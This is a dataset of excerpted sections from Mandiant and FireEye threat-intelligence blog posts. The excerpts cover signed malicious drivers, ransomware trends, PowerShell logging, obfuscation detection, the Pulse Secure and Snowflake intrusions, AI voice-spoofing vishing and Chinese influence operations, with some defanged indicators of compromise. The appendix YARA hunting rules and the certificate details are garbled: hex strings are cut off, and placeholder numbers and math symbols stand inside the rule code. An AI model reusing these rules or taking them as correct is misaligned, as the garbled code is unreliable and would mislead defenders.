new occurrence; both GData and BitDefender released reports on Microsoft signed malicious drivers in 2021. \"Microsoft signed a malicious Netfilter rootkit\" and \"Digitally-Signed Rootkits are Back \u2013 A Look at FiveSys and Companions\" discussed malicious drivers signed via the same attestation process discussed in this blog post. \nWhile this blog post has focused on POORTRY and the attestation signing process, Mandiant has observed other malware being signed via attestation. TEMPLESHOT is a malware family consisting of dropper, backdoor, a filter driver, and a protection driver. The TEMPLESHOT driver with MD5  48bf11dd6c22e241b745d3bb1d562ca1  has been observed in the wild and is signed via attestation. ", "source": "mandiant"}, {"title": "Appendix", "content": "import \"pe\" rule M_Hunting_Signed_Driver_Attestation_1 \n{ meta: author $=$ \"Mandiant\" date_created $=$ \"2022-10-20\" date_updated $=$ \"2022-04-24\" revision $=$ \"2\" //Refined OID de description $=$ \"Find driver signed strings: \\$whql_attest_oid $=$ {2b060104018237 \\$spc_statement_type $=$ {2b060104018 \\$spc_sp_opus_info_oid $=$ {2b0601040 condition: pe.signatures[0].subject $\\therefore\\because\\quad\\uparrow\\complement=\\cup5.$ \\$whql_attest_oid and \\$spc_sp_opus_info_oid and \\$spc_statement_type   \n}   \n\uedd9import \"pe\"   \nrule M_Win_Hunting_CertEngine_Attestation_   \n{ meta: author $=$ \"Mandiant\" date_created $=$ \"2022-10-20\" date_updated $=$ \"2022-04-24\" revision $=$ \"2\" //Refined OID de description $=$ \"Find driver signed strings: \\$whql_attest_oid $=$ {2b060104018237 \\$spc_statement_type $=$ {2b060104018 \\$spc_sp_opus_info_oid $=$ {2b0601040   \n\\$unicode1 $=$ {59278FDE 7EB568A6 7F517EDC 79 $\\$123,456,789$ \n$\\$123,456,789$ $\\$123,456,789$ $\\S\\ U\\cap{\\mathrm{i}}{\\mathrm{code}}5={\\mathrm{\\{48~}}}\\theta\\theta{\\mathrm{~61~}}\\theta\\theta{\\mathrm{~6e~}}\\theta\\theta$ $\\$123,456,789$ $\\$123,456$ b $\\$123,456$ 5 $\\S\\ U\\cap{\\mathrm{i}}{\\mathrm{code}}9~=~\\{798\\in~5\\mathrm{e}\\d{\\cdot}{\\mathrm{a}}~5965~52^{\\circ}$ $\\$123,456$ condition: \\$whql_attest_oid and \\$spc_sp_opus_info_oid and \\$spc_statement_type and pe.signatures[0].subject $\\therefore\\because\\prime110=115,$ (1 of (\\$unicode\\*)) } \nimport \"vt\"   \nimport \"pe\"   \nrule M_CertEngine_Malicious_Attestation_Si   \n{ meta: author $=$ \"Mandiant\" date_created $=$ \"2022-10-20\" date_updated $=$ \"2022-04-24\" revision $=$ \"2\" //Refined OID de description $=$ \"Find driver signed strings: \\$whql_attest_oid $=$ {2b0601040182370 \\$spc_statement_type $=$ {2b060104018 \\$spc_sp_opus_info_oid $\\begin{array}{r l}{=}&{{}\\{2\\mathsf{b}\\theta6\\Theta1\\theta4\\Theta_{-}^{\\prime}}\\end{array}$ condition: for any tag in vt.metadata.tags : pe.signatures[0].subject $\\therefore\\because\\quad\\uparrow\\complement=\\cup5.$ vt.metadata.analysis_stats.malicio \n\\$whql_attest_oid and \\$spc_sp_opus_info_oid and \\$spc_statement_type } rule M_Hunting_Win_ConventionEngine_PDB_At { meta: author $=$ \"Mandiant\" date_created $=$ \"2022-10-20\" description $=$ \"Looking for PDB path strings: \\$anchor $=$ \"RSDS\" $\\$123,456,789$ $\\$123,456,789$ $\\$123,456,789$ -Z \\$pdb4 = /RSDS[\\x00-\\xFF]{20}[a-zA-Z \\$pdb5 = /RSDS[\\x00-\\xFF]{20}[a-zA-Z \\$pdb6 = /RSDS[\\x00-\\xFF]{20}[a-zA-Z \\$pdb7 = /RSDS[\\x00-\\xFF]{20}[a-zA-Z \\$pdb8 $=$ /RSDS[\\x00-\\xFF]{20}[a-zA-Z condition: (uint16(0) $==$ 0x5A4D) and uint32(u } ", "source": "mandiant"}, {"title": "Appendix", "content": "The following certificate details are extracted from the certificate signing to the POORTRY sample. However, note that this is a legitimate attestation signing Microsoft certificate. Note that some details were removed for brevity. \nCertificate: Data: Version: 3 (0x2) Serial Number: 33:00:00:00:57:ee:4d:65:9a:92:3 Signature Algorithm: sha256WithRSAE Issuer: ${\\mathsf{C}}={\\mathsf{U}}{\\mathsf{S}}$ , ST $=$ Washington, L Validity Not Before: Jun  7 18:08:06 202 Not After : Jun  1 18:08:06 202 Subject: ${\\mathsf{C}}={\\mathsf{U}}{\\mathsf{S}}$ , ST $=$ Washington, Subject Public Key Info: Public Key Algorithm: rsaEncryp RSA Public-Key: (2048 bit) Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Extended Key Usage: 1.3.6.1.4.1.311.10.3.5, 1. X509v3 Subject Key Identifier: 41:8F:FB:78:B4:1F:1F:7F:19: X509v3 Subject Alternative Nam DirName:/OU $=$ Microsoft Oper X509v3 Authority Key Identifie keyid:C8:3A:9C:A7:4A:C3:23: ", "source": "mandiant"}, {"title": "Introduction", "content": "particularly in comparison to other types of cyber crime. Mandiant observed an increase in ransomware activity in 2023 compared to 2022, including a $75\\%$ increase in posts on data leak sites (DLS), and an over $20\\%$ increase in Mandiant-led investigations involving ransomware from 2022 to 2023 (Figure 1). These observations are consistent with other reporting, which shows a record-breaking more than \\$1 billion USD paid to ransomware attackers in 2023. \nThis illustrates that the slight dip in extortion activity observed in 2022 was an anomaly, potentially due to factors such as the invasion of Ukraine and the leaked CONTI chats. The current resurgence in extortion activity is likely driven by various factors, including the resettling of the cyber criminal ecosystem following a tumultuous year in 2022, new entrants, and new partnerships and ransomware service offerings by actors previously associated with prolific groups that had been disrupted. \nThis blog post provides an overview of the ransomware landscape and common tactics, techniques, and procedures (TTPs) directly observed by Mandiant in 2023 ransomware incidents. Our analysis of TTPs relies primarily on data from Mandiant incident response engagements and therefore represents only a sample of global ransomware intrusion activity. The majority of these incidents involved the post-compromise deployment of ransomware following network intrusion activity, with many incidents also involving data theft \nand the Caribbean, the Middle East, and North America, and within nearly every industry sector. \nRead our Ransomware Protection and Containment Strategies paper for in-depth strategies to defend against ransomware. ", "source": "mandiant"}, {"title": "Background", "content": "Attackers and developers of penetration-testing frameworks are increasingly leveraging Windows PowerShell to conduct their operations. PowerShell is an extremely powerful command environment and scripting language that is built in to Microsoft Windows. By default, PowerShell does not leave many artifacts of its execution in most Windows environments. The combination of impressive functionality and stealth has made attacks leveraging PowerShell a nightmare for enterprise security teams[1]. \nPowerShell 2.0, which comes installed on all Windows 7/2008 systems, provides very little evidence of attacker activity. The Windows event logs show that PowerShell executed, the start and end times of sessions, and whether the session executed locally or remotely (ConsoleHost or ServerRemoteHost). However, they reveal nothing about what was executed with PowerShell. Figure 1 shows an example of the event log messages recorded in the PowerShell 2.0 log Windows PowerShell.evtx. \nMicrosoft has been taking steps to improve the security transparency of PowerShell in recent versions. The most significant improvements, such as enhanced logging, were released in PowerShell version 5.0. This enhanced logging records executed PowerShell commands and scripts, deobfuscated code, output, and transcripts of attacker activity. Enhanced PowerShell logging is an invaluable resource, both for enterprise monitoring and incident response. \nPowerShell 5.0 is the current release for Windows 7/2008 R2 and above. Though many of the enhanced logging features of PowerShell 5.0 were backported to version 4.0, Mandiant recommends installing PowerShell 5.0 on all Windows platforms. PowerShell 5.0 includes features not available in 4.0, including suspicious script block logging. ", "source": "mandiant"}, {"title": "Background", "content": "There has been a long history of obfuscation being employed to hide the presence of malware, ranging from encryption of malicious payloads (starting with the Cascade virus) and obfuscation of strings, to JavaScript obfuscation. The purpose of obfuscation is two-fold: \nMake it harder to find patterns in executable code, strings or scripts that can easily be detected by defensive software. Make it harder for reverse engineers and analysts to decipher and fully understand what the malware is doing. \nIn that sense, command line obfuscation is not a new problem \u2013 it is just that the target of obfuscation (the Windows Command Processor) is relatively new. The recent release of tools such as Invoke-Obfuscation (for PowerShell) and InvokeDOSfuscation (for cmd.exe) have demonstrated just how flexible these commands are, and how even incredibly complex obfuscation will still run commands effectively. \nThere are two categorical axes in the space of obfuscated vs. non-obfuscated command lines: simple/complex and clear/obfuscated (see Figure 1 and Figure 2). For this discussion \"simple\" means generally short and relatively uncomplicated, but can still contain obfuscation, while \"complex\" means long, complicated strings that may or may not be obfuscated. Thus, the simple/complex axis is orthogonal to obfuscated/unobfuscated. The interplay of these two axes produce many boundary cases where simple heuristics to detect if a script is \nObfuscated Command Line Detection Using Machine Learning | Mandiant | Google obfuscated (e.g. length of a command) will produce false positives on unobfuscated samples. The flexibility of the command line processor makes classification a difficult task from an ML perspective. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post we described an ML approach to detecting obfuscated Windows command lines, which can be used as a signal to help identify malicious command line usage. Using ML techniques, we demonstrated a highly accurate mechanism for detecting such command lines without resorting to the often inadequate and costly technique of maintaining complex if-then rules and regular expressions. The more comprehensive ML approach is flexible enough to catch new variations in obfuscation, and when gaps are detected, it can usually be handled by adding some well-chosen \n2025/5/7 11:29 \nObfuscated Command Line Detection Using Machine Learning | Mandiant | Google Cloud Blog evader samples to the training set and retraining the model. \nThis successful application of ML is yet another demonstration of the usefulness of ML in replacing complex manual or programmatic approaches to problems in computer security. In the years to come, we anticipate ML to take an increasingly important role both at FireEye and in the rest of the cyber security industry. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "You can use the IDAPython script idb2pat.py to quickly and easily generate function patterns for IDA Pro FLIRT signatures. This helps IDA automatically rename common functions in compiled programs. The script works on both 32- and 64-bit programs, and because it is written in Python, it can be easily updated and modified by users. I hope you'll give \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "The Taidoor malware has been used to successfully compromise targets since 2008. This threat has evolved over time, and has recently leveraged Yahoo Blogs as a mechanism to drop the Taidoor malware as a \"second stage\" component. In addition, the well-known Taidoor network traffic pattern has been modified, likely as a new way to avoid networkbased detection. ", "source": "mandiant"}, {"title": "Introduction", "content": "Mandiant is currently tracking 12 malware families associated with the exploitation of Pulse Secure VPN devices. These families are related to the circumvention of authentication and backdoor access to these devices, but they are not necessarily related to each other and have been observed in separate investigations. It is likely that multiple actors are responsible for the creation and deployment of these various code families. \nThe focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base (DIB) networks, but detailed malware analysis and detection methods for all samples observed at U.S. and European victim organizations are provided in the technical annex to assist network defenders in identifying a large range of malicious activity on affected appliances. Analysis is ongoing to determine the extent of the activity. \nMandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat Intelligence Center (MSTIC), and relevant government and law enforcement agencies to investigate the threat, as well as develop recommendations and mitigations for affected Pulse Secure VPN appliance owners. \nAs part of their investigation, Ivanti has released mitigations for a vulnerability exploited in relation to this campaign as well as the Pulse Connect Secure Integrity Tool to assist with determining if systems have been impacted. ", "source": "mandiant"}, {"title": "Attribution", "content": "We are in the early stages of gathering evidence and making attribution assessments and there are a number of gaps in our understanding of UNC2630, UNC2717, and these 12 code families. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this analysis to assist network defenders in triaging and identifying malicious activity on affected appliances. \nMandiant is able to assess that: \nUNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE, THINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and \nAuthentication Bypass Techniques and Pulse Secure Zero-Day | Google Cloud Blo PULSECHECK as early as August 2020 until March 2021. \nWe suspect UNC2630 operates on behalf of the Chinese government and may have ties to APT5   \nUNC2717 targeted global government agencies between October 2020 and March 2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP. We do not have enough evidence about UNC2717 to determine government sponsorship or suspected affiliation with any known APT group.   \nWe do not have enough information about the use of LOCKPICK to make an attribution statement. ", "source": "mandiant"}, {"title": "Introduction", "content": "Last year, Mandiant published a blog post on threat actor use of generative AI, exploring how attackers were using generative AI (gen AI) in phishing campaigns and information operations (IO), notably to craft more convincing content such as images and videos. We also shared insights into attackers' use of large language models (LLMs) to develop malware. In the post, we emphasized that while attackers are interested in gen AI, use has remained relatively limited. \nThis post continues on that initial research, diving into some new AI tactics, techniques, and procedures (TTPs) and trends. We take a look at AIpowered voice spoofing, demonstrate how Mandiant red teams use it to test defenses, and provide security considerations to help stay ahead of the threat. ", "source": "mandiant"}, {"title": "Overview", "content": "Unlike its traditionally email-based counterpart, vishing (voice phishing) uses a voice-based approach. Rather than sending out an email with the hopes of garnering clicks, threat actors will instead place phone calls directly to individuals in order to earn trust and manipulate emotions, often by creating a sense of urgency. \nLike traditional phishing, a threat actor's goal is to deceive individuals into divulging sensitive information, initiating malicious actions, or transferring funds using social engineering tactics. These deceptive calls often impersonate trustworthy entities such as banks, government agencies, or \nThe rise of powerful AI tools such as text generators, image creators, and voice synthesizers has sparked a wave of open-source projects, making these technologies more accessible than ever before. This rapid development is putting the power of AI into the hands of a wider audience, fueling the potential for more convincing vishing attacks. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we explored how modern AI tools can help create more convincing vishing attacks. The alarming success of Mandiant's vishing underscores the urgent need for heightened security measures against AI voice-spoofing attacks. While technology offers powerful tools for both attackers and defenders, the human element remains the critical vulnerability. The case study we shared should serve as a wake-up call, urging organizations and individuals alike to take proactive steps. \nMandiant started leveraging AI voice-spoofing attacks in its more complex Red Team Assessments and Social Engineering Assessments to demonstrate increases in frequency, it is imperative that defenders plan and take precautions. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Conclusion", "content": "As Mandiant continues to investigate UNC3886, this blog post further reinforces UNC3886's deep understanding and technical knowledge of ESXi, vCenter and VMware's virtualization platform. UNC3886 continues to target devices and platforms that traditionally lack EDR solutions and make use of zero-day exploits on those platforms. UNC3886 continues to present challenges to investigators by disabling and tampering with logging services, selectively removing log events related to their activity. The threat actors' retroactive cleanup performed within days of past public disclosures on their activity indicates how vigilant they are. Organizations must remain vigilant and ensure that they're not only monitoring their network at the \noperating system layer, but also continue to patch, maintain, and monitor the appliances that are running the underlying infrastructure. ", "source": "mandiant"}, {"title": "Conclusion", "content": "If by now you're thinking this is all kind of silly, don't worry, you're in good company. PDB paths are indeed a wonky attribute of a file. The mere presence of these paths in an executable is by no means evil, yet when these paths are present in pieces of malware, they usually represent acts of operational indiscretion. The idea of detecting malware based on PDB paths is kind of like detecting a robber based on what type of hat a person is wearing, if they're wearing one at all. \nWe have been historically successful in using PDB paths mostly as an analytical pivot, to help us cluster malware families and track malware developers. When we began to study PDB paths holistically, we noticed that many malware authors were using many of the same naming conventions for their folders and project files. They were naming their malware projects after the functionality of the malware itself, and they routinely label their projects with unique, descriptive language. \nWe found that many malware authors and operators leaked PDB paths that described the functionality of the malware itself and gave us insight into the development environment. Furthermore, outside of the descriptors of the malware development files and environment, when PDB files are present, we identified anomalies that help us identify files that are more likely to be circumstantially interesting. There is room for red team and offensive operators to improve their tradecraft by falsifying PDB paths for purposes of stealth or razzle-dazzle. \nWe remain optimistic that we can squeeze some juice from PDB paths when they are present. A survey of about 2200 named malware families (including all samples from 41 APT and 10 FIN groups and a couple million other uncategorized executables) shows that PDB paths are present in malware about five percent of the time. Imagine if you could have a detection \"backup plan\" for five plus percent of malware, using a feature that is itself inherently non-malicious. That's kind of cool, right? ", "source": "mandiant"}, {"title": "Conclusion", "content": "Based on previous observations, the phishing and lure techniques used in these recent HawkEye campaigns have remained consistent, as have the HawkEye binaries and associated payloads. However, the attackers have altered the initial delivery method to use an embedded OLE object, as opposed to past methods such as a macro embedded in a Word document. The threat landscape is continiously evolving, and we expect to see more new tricks and tactics being used by the actors using this malware family. \nFireEye Multi Vector Execution (MVX) engine is able to recognize and block this threat. ", "source": "mandiant"}, {"title": "Overview", "content": "Based on our investigations to date, UNC5537 obtained access to multiple organizations' Snowflake customer instances via stolen customer credentials. These credentials were primarily obtained from multiple infostealer malware campaigns that infected non-Snowflake owned systems. This allowed the threat actor to gain access to the affected customer accounts and led to the export of a significant volume of customer data from the respective Snowflake customer instances. The threat actor has subsequently begun to extort many of the victims directly and is actively attempting to sell the stolen customer data on recognized cybercriminal forums. \nMandiant identified that the majority of the credentials used by UNC5537 were available from historical infostealer infections, some of which dated as far back as 2020. \nThe threat campaign conducted by UNC5537 has resulted in numerous successful compromises due to three primary factors: \n1. The impacted accounts were not configured with multi-factor authentication enabled, meaning successful authentication only required a valid username and password.   \n2. Credentials identified in infostealer malware output were still valid, in some cases years after they were stolen, and had not been rotated or updated.   \n3. The impacted Snowflake customer instances did not have network allow lists in place to only allow access from trusted locations. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant has been tracking UNC5537, a financially motivated threat actor, as a distinct cluster since May 2024. UNC5537 has targeted hundreds of organizations worldwide, and frequently extorts victims for financial gain. UNC5537 operates under various aliases on Telegram channels and cybercrime forums. Mandiant has identified members having associations to other tracked \nUNC5537 Targets Snowflake Customer Instances for Data Theft and Extortion | Google Cloud Blog groups. Mandiant assesses with moderate confidence that UNC5537 comprises members based in North America, and collaborates with an additional member in Turkey. ", "source": "mandiant"}, {"title": "Summary", "content": "To suspend a program that you are running within an IDA Pro $^+$ WinDbg remote debug session to capture a reusable VM snapshot: \n1. Suspend all threads (WinDbg: $\\sim^{\\star}\\mathsf{n}.$ )   \n2. Detach from the process (IDA Pro: Debugger $->$ Detach from process)   \n3. Capture your VM snapshot \nTo resume the suspended program: \n1. Attach to the remote process (IDA Pro: Debugger $->$ Attach to process...) 2. Resume all threads (WinDbg: $\\sim^{\\star}\\mathsf{m}.$ ) 3. Resume debugging as normal \nIf you aren't interested in using WinDbg commands, you can instead use SysInternals' Process Explorer to suspend the process in your debugging VM and simply detach using IDA Pro. You could also write a Python ctypes script or native program to directly use the relevant Windows APIs if you prefer \nDebugging Complex Malware that Executes Code on the Heap | Mandiant | Google Cloud Blog (specifically via CreateToolhelp32Snapshot with the TH32_SNAPTHREAD flag, OpenThread, SuspendThread, and ResumeThread). \nThis tactic allows us to cope with complex multistage shellcode or modular malware that has several (sometimes cascading) unpacked code regions. It lets us create save points in our debug session while maintaining the same memory map so our disassembly annotations always remain aligned with the memory map in the debug session. It also allows us to suspend malware execution in one debugger and pick it up in another, provided each debugger allows thread suspend count to remain at a non-zero value before detaching. \nBefore closing, I'd like to give credit to Tarik Soulami for his explanation of WinDbg thread management in his book, \"Inside Windows Debugging\" (Microsoft Press, 2012). If you're starting to confront more difficult debugging scenarios in your journey as a reverse engineer, I strongly encourage you to pick up \"Inside Windows Debugging\" to augment your repertoire and further understand the powerful debugging capabilities of WinDbg and Windows itself. ", "source": "mandiant"}, {"title": "Conclusion", "content": "These stories illustrate the potential for generative AI to assist the defender across a range of use cases. Within the \"threat, toil, and talent\" framing, a consistent stand-out theme across these stories is how generative AI is helping reduce the \"toil and talent\" problems in particular. When speed matters in an incident response, being able to quickly automate certain functions, and without deep technical specialties in certain niche areas, defenders are able to better detect and respond to attackers. \nThough AI may increase the capabilities of the adversary in certain ways, it will also afford advantages for defenders to the benefit of entrepreneuring organizations. We hope that this blog post has spurred some ideas about how to start incorporating AI into the security practices of your organization. For more on security best practices and responsible AI model implementation, be sure to check out Google's Secure AI Framework. ", "source": "mandiant"}, {"title": "Introduction", "content": "threats. An expansive ecosystem of systems, administrators, campaign infrastructure, and public communications venues must be secured against a diverse array of operators and methods. Any election cybersecurity strategy should begin with a survey of the threat landscape to build a more proactive and tailored security posture. \nThe cybersecurity community must keep pace as more than two billion voters are expected to head to the polls in 2024. With elections in more than an estimated 50 countries, there is an opportunity to dynamically track how threats to democracy evolve. Understanding how threats are targeting one country will enable us to better anticipate and prepare for upcoming elections globally. At the same time, we must also appreciate the unique context of different countries. Election threats to South Africa, India, and the United States will inevitably differ in some regard. In either case, there is an opportunity for us to prepare with the advantage of intelligence. \nThe variety of threat actors and intentions exposes election-related targets to a range of cyber threat vectors. In addition to tactics that Mandiant commonly associates with cyber intrusion activity, such as phishing, exploitation of internet-exposed systems, and data theft, election cyber threat activity also seeks to influence public perceptions and voter choices. The tactics to accomplish this public-facing objective often leverage disruptive tactics. This includes web defacements, DDoS \nForeign state aligned information operations disseminate content on websites and social media. This is often intended to mislead target populations or encourage social divisions and mistrust in leaders and institutions. \nDespite the variety of cybersecurity challenges facing election ecosystems, it is important for the security community to remain level-headed. Information operations and disruptive cyber campaigns thrive when their impacts are built up. This makes objective and data-driven analysis essential. The variety of election cyber threat vectors presents complexity, but also highlights that direct election result interference attempts account for a small proportion of the overall threat landscape. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Impacts to elections are not a foregone conclusion. Many of the aforementioned actors have struggled to influence or achieve significant effects, despite their best efforts. Wary and experienced defenders and populations are harder targets and without the element of surprise adversaries will be at a disadvantage. \nWithin Google, we are blending different perspectives on the threat landscape across TAG, Mandiant, VirusTotal, Google Cloud, and Trust & Safety. And we're sharing information about intelligence, insights, and the action we're taking with the security community and broader public through a variety of fora, such as our Google Safety Engineering Centers, Mandiant reporting, and the quarterly TAG Bulletin on the coordinated influence operation campaigns that Google disrupts. ", "source": "mandiant"}, {"title": "Conclusion", "content": "FireEye observed CVE-2017-0199, a vulnerability in Microsoft Word that allows an attacker to execute a malicious Visual Basic script. The CVE-2017-0199 vulnerability is a logic bug and bypasses most mitigations. Upon execution of the malicious script, it downloads and executes malicious payloads, as well as displays decoy documents to the user. The two documents achieve execution of their malicious payloads, with one containing LATENTBOT and the other containing WingBird/FinFisher. The malicious document contained only a link to the attacker controlled server, showing the advantage of FireEye's MVX engine to detect multi-stage attacks. Further campaigns leveraging this attack have been observed prior to patch availability, but are not covered in this blog. \nWe recommend that Microsoft Office users apply the patch as soon as possible. ", "source": "mandiant"}, {"title": "Acknowledgement", "content": "Thank you to Michael Matonis, Dhanesh Kizhakkinan, Yogesh Londhe, Swapnil Patil, Joshua \nTriplett, and Tyler Dean from FLARE Team, FireEye Labs Team, and FireEye iSIGHT Intelligence for their contributions to this blog. Thank you as well to everyone who worked with us at the Microsoft Security Response Center (MSRC). \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "While the detections listed in this post can certainly assist in detecting the presence of malicious activity, it is also important to keep in mind that defensive measures against PhaaS attacks can be a game of cat and mouse. As quickly as threat actor infrastructure gets taken down, new infrastructure can be spun up. To that end, in addition to leveraging the detections provided in this post, there are a few ways organizations can reduce impact of phishing attacks and compromised domains on a strategic level. These include: \nPeriodically evaluating any public-facing web infrastructure and files against known-good versions of the content. Utilizing behavioral analytics for web logs analysis to include initial URL structure, form submission and redirections.   \nOccasionally re-assessing security policies regarding passwords and credential resets.   \nImplementing two-factor authentication on, at a minimum, any user account used to access an enterprise environment from an external source. \nThough these strategic elements may seem somewhat self-evident, they are far from being overstated in their importance. Traditional phishing techniques continue to be a reliable Initial Intrusion Vector (IIV) for cyberattacks, and, as demonstrated by the Caffeine PhaaS platform, the tools to conduct full-fledged enterprise-level phishing campaigns are cheap to acquire, simple to use, and readily available to adversaries. ", "source": "mandiant"}, {"title": "Targeting", "content": "Mandiant has observed UNC3944 targeting Active Directory Federated Services (ADFS), when in use, specifically to export the ADFS certificates. With these certificates and through the use of a Golden SAML attack, easier and persistent access to cloudbased applications can occur. Correlating events on the ADFS to the service provider sign-in logs can assist with the detection of forged SAML tokens. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post we have introduced the FLARE team's newest contribution to the malware analysis community. capa is an open-source framework to encode, recognize, and share behaviors seen in malware. We think that the community needs this type of tool to fight back against the volume of malware that we encounter during investigations, hunting, and triage. Regardless of your background, when you use capa, you invoke decades of cumulative experience to figure out what a program does. \nTry out capa in your next malware analysis. The tool is extremely easy to use and can provide valuable information for forensic analysts, incident responders, and reverse engineers. If you enjoy the tool, run into issues using it, or have any other comments, please contact us via the projects GitHub page. ", "source": "mandiant"}, {"title": "Conclusion", "content": "ML models experience an inherent struggle: not retraining means being vulnerable to new classes of threats, while retraining causes churn and potentially reintroduces old vulnerabilities. In this blog post, we have discussed two different approaches to modifying ML model training in order to reduce churn: incremental model training and churn-aware learning. Both demonstrate effectiveness in the EMBER malware classification \ndata set by reducing the bad churn, while simultaneously improving accuracy. Finally, we also demonstrated the novel conclusion that reducing churn in a data set with label noise can result in a more accurate model. Overall, these approaches provide low technical debt solutions to updating models that allow data scientists and machine learning engineers to keep their models up-to-date against the latest cyber threats at minimal cost. At FireEye, our data scientists work closely with the FireEye Labs detection analysts to quickly identify misclassifications and use these techniques to reduce the impact of churn on our customers. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Targeting", "content": "In June, additional DRAGONBRIDGE social media accounts began targeting two additional rare earths mining and manufacturing companies, the Canadian rare earths mining company Appia Rare Earths & Uranium Corp and the American rare earths supplier USA Rare Earth. Accounts acted in response to announcements made by the respective companies regarding potential or planned operations, echoing previous criticisms centering around alleged environmental and labor concerns. Notably, DRAGONBRIDGE's targeting of additional rare earths mining companies underscores the campaign's ability to monitor developments and respond accordingly, as well as its investment in attempting to ensure the PRC's market dominance in the industry. \nDRAGONBRIDGE accounts targeted Appia with negative messaging in response to the company's announcement on June 1 that it had discovered a new rare earths bearing zone in Saskatchewan, Canada. As with the planned Lynas facility in Texas, accounts professed concern for the environmental implications of Appia's actions and the health of its workers. \nFollowing USA Rare Earth's announcement of a planned rare earths manufacturing facility in Oklahoma on June 9, DRAGONBRIDGE reiterated concerns surrounding the alleged impact of rare earths mining and processing, highlighting similar themes on the risks involved. ", "source": "mandiant"}, {"title": "Attribution", "content": "We observed multiple newly identified accounts promote the same content as previously identified DRAGONBRIDGE accounts both prior to and \nfollowing their promotion of content pertaining to Lynas. This includes content critical of the Chinese businessman Guo Wengui (Miles Kwok), former White House Chief Strategist Steve Bannon, and Chinese virologist Dr. Yan Limeng, as well as narratives pertaining to the origin of COVID-19 (Figure 5). For example, accounts promoted a report we judged to be falsely attributed to the Milk Tea Alliance, a pro-democracy network consisting primarily of netizens in Asia, which put forth multiple theories on the origin of COVID-19. We have previously noted both criticism of these specific individuals and COVID-19 origin theories as common themes in the DRAGONBRIDGE campaign. \nAs with other DRAGONBRIDGE accounts we have previously identified, the newly identified accounts in this activity set have shown similar indicators of inauthenticity and coordination. For example, accounts used profile photos appropriated from various online sources, including stock photography, animals, and cartoons, suggesting that they sought to obfuscate their identities; most of the Twitter accounts were created in clusters between March and June 2022, suggesting possible batch creation of the accounts, a tactic we have previously observed with this campaign. Many of the usernames consisted of English-language names followed by seemingly random numeric strings. In addition to the accounts' posting of identical or similar rare earths-related content, we also observed some of the accounts post identical or similar apolitical content, such as inspirational quotes, wellness, travel, and sports content. ", "source": "mandiant"}, {"title": "Targeting", "content": "Direct access to production cryptocurrency infrastructure from developer workstations is especially risky. Mandiant has observed threat actors leveraging footholds on developer systems to interact with such infrastructure: \nTargeted phishing via fake job opportunities: State-sponsored threat actors leveraged fake job postings on \nLinkedIn to deliver malware to developers and their highly privileged systems, leading to privileged access to cryptocurrency infrastructure. \nAWS CLI abuse: Attackers have used the AWS CLI to interact with and extract secrets from wallet infrastructure hosted in Elastic Kubernetes Service (EKS). \nAPI key compromise: In some cases, attackers leveraged their foothold to make API requests to the cryptocurrency custodian platform using keys stored within scripts and API testing applications. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Cryptocurrency organizations operate in a challenging threat landscape where the risk of immediate and substantial financial loss is high. The convergence of high-value digital assets, complex and rapidly evolving technologies, and the pressures of a rapidly evolving market, creates an environment where organizations should expect to be targeted. \nThe recommendations in Securing Cryptocurrency Organizations provide a starting point for bolstering defenses, however security is not a point-in-time achievement, and organizations should aim for continuous improvement. \nMandiant's recommendations highlight the importance of a multi-faceted enterprise security approach for every size of cryptocurrency organization. This includes the secure management of wallet infrastructure, robust access controls, and securing systems which interact with infrastructure, such as developer and signing workstations. Mandiant has also emphasized the importance of proactive threat detection to identify malicious activity earlier within wallet infrastructure, wider platform infrastructure, and on employee workstations. Finally, organizations should be prepared to respond to an intrusion with suitable data available to support an investigation, and appropriate containment and hardening controls to limit the impact. \nThe task of securing a cryptocurrency organization is complex. By embracing a culture of proactive security, continuous improvement, and implementing the recommendations in Securing Cryptocurrency Organizations as a baseline, Mandiant hopes that the number of successful intrusions decreases across the industry. ", "source": "mandiant"}, {"title": "Background", "content": "Beginning on Oct. 24 at 08:00 UTC, FireEye detected and blocked attempts to infect multiple clients with a drive-by download masquerading as a Flash Update (install_flash_player.exe) that delivered a wormable variant of ransomware. Users were redirected to the infected site from multiple legitimate sites (e.g. \nhttp://www.mediaport[.]ua/sites/default/files/pagemain.js) simultaneously, indicating a coordinated and widespread strategic web compromise campaign. \nFireEye network devices blocked infection attempts at over a dozen victims primarily in Germany, Japan, and the U.S. until Oct. 24 at 15:00 UTC, when the infection attempts ceased and attacker infrastructure \u2013 both 1dnscontrol[.]com and the legitimate websites containing the rogue code \u2013 were taken offline. ", "source": "mandiant"}, {"title": "Background", "content": "From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded \ncommand and control (C2) server. RIPTIDE's first communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to encrypt all further communication. \nIn June 2014, Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth. The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014. \nFollowing the release of the article, FireEye observed a distinct change in RIPTIDE's protocols and strings. We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors. The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules. FireEye dubbed this new malware family HIGHTIDE. ", "source": "mandiant"}, {"title": "Conclusion", "content": "FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease malware detection while APT12 developed a completely new malware toolset. These development efforts may have resulted in the emergence of the WATERSPOUT backdoor. \nAPT12's adaptations to public disclosures lead FireEye to make several conclusions about this threat group: \nThough 